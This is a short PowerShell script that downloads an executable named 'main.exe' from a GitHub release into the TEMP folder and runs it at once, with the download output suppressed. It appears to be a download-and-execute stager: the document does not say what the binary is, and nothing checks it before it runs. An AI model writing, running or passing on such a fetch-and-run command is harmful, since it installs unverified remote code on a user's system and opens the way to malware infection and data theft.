$_path = Join-Path $Env:TEMP "main.exe"
curl.exe -L "https://github.com/OverseerArk/20-11/releases/download/Main/main.exe" -o $_path | Out-Null
Start-Process $_path -Wait